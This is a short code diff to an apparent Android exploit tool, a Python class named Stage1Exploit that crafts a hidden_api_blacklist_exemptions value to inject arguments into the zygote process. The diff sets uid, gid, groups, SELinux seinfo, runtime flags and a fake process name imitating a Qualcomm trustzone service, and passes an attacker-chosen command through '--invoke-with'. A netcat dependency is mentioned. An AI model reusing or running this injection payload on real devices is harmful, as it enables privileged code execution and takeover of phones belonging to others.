@@ -179,6 +179,8 @@ class Stage1Exploit:
         else:
             raise ZygoteInjectionException("netcat binary was not found")
 
+   
+
     @staticmethod
     def generate_stage1_exploit(command: str, exploit_type: str) -> str:
         "generates the hidden_api_blacklist_exemptions value to trigger the exploit"
@@ -190,10 +192,12 @@ class Stage1Exploit:
             "--setuid=10079",
             "--setgid=10079",
             "--setgroups=3003",
+            "--target-sdk-version=28",
+            "--nice-name=com.qualcomm.qti.qms.service.trustzoneaccess",
+            "--app-data-dir=/data/user/0/com.qualcomm.qti.qms.service.trustzoneaccess",
             "--runtime-args",
-            "--seinfo=ssgapp:ssg_app:targetSdkVersion=28:complete",
-            "--runtime-flags=1",
-            "--nice-name=ssgapp",
+            "--seinfo=ssgapp:ssg_app:complete",
+            "--runtime-flags=32767",
             "--invoke-with",
             f"{command}#",
         ]
